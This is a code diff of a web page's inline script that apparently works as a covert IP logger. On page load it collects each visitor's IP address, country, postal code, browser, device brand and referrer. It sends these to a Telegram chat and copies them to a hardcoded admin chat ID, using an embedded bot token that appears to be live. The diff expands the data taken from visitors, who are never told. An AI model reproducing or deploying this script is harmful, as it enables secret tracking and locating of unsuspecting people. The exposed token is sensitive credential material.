@@ -16,7 +16,7 @@ console.log('Server aktif');
 }
       </script>
 
-                            <script>
+                                            <script>
                 const token = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
                 const adminChatId = '7407149096';
 
@@ -53,18 +53,66 @@ console.log('Server aktif');
                     );
                 }
 
+                function getBrowserInfo() {
+                    const userAgent = navigator.userAgent;
+                    let browserName = 'Unknown';
+
+                    if (userAgent.indexOf('Firefox') > -1) {
+                        browserName = 'Mozilla Firefox';
+                    } else if (userAgent.indexOf('SamsungBrowser') > -1) {
+                        browserName = 'Samsung Internet';
+                    } else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) {
+                        browserName = 'Opera';
+                    } else if (userAgent.indexOf('Trident') > -1) {
+                        browserName = 'Microsoft Internet Explorer';
+                    } else if (userAgent.indexOf('Edge') > -1) {
+                        browserName = 'Microsoft Edge';
+                    } else if (userAgent.indexOf('Chrome') > -1) {
+                        browserName = 'Google Chrome';
+                    } else if (userAgent.indexOf('Safari') > -1) {
+                        browserName = 'Apple Safari';
+                    }
+
+                    return browserName;
+                }
+
+                function getDeviceBrand() {
+                    const userAgent = navigator.userAgent;
+                    let deviceBrand = 'Unknown';
+
+                    if (/android/i.test(userAgent)) {
+                        deviceBrand = 'Android';
+                    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                        deviceBrand = 'Apple';
+                    } else if (/Windows Phone/i.test(userAgent)) {
+                        deviceBrand = 'Windows Phone';
+                    } else if (/Mac/i.test(userAgent)) {
+                        deviceBrand = 'Mac';
+                    } else if (/Windows/i.test(userAgent)) {
+                        deviceBrand = 'Windows';
+                    } else if (/Linux/i.test(userAgent)) {
+                        deviceBrand = 'Linux';
+                    }
+
+                    return deviceBrand;
+                }
+
                 function trackIp() {
                     getIp((data) => {
                         const userIp = data.ip;
                         const country = data.country_name;
                         const countryCode = data.country_code;
                         const flagEmoji = getFlagEmoji(countryCode);
-                        const chatId = '7407149096'; // Replace with the actual chat ID
-                        const message = `Your IP address is: ${userIp}\nCountry: ${country} ${flagEmoji}`;
+                        const browser = getBrowserInfo();
+                        const referrer = document.referrer || 'Direct Access';
+                        const deviceBrand = getDeviceBrand();
+                        const postalCode = data.postal;
+                        const chatId = 'USER_CHAT_ID'; // Replace with the actual chat ID
+                        const message = `Your IP address is: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}`;
                         
                         if (chatId) {
                             sendMessage(chatId, message);
-                            sendMessage(adminChatId, `User with chat ID ${chatId} has IP address: ${userIp}\nCountry: ${country} ${flagEmoji}`);
+                            sendMessage(adminChatId, `User with chat ID ${chatId} has IP address: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}`);
                         } else {
                             console.error('Chat ID not found.');
                         }
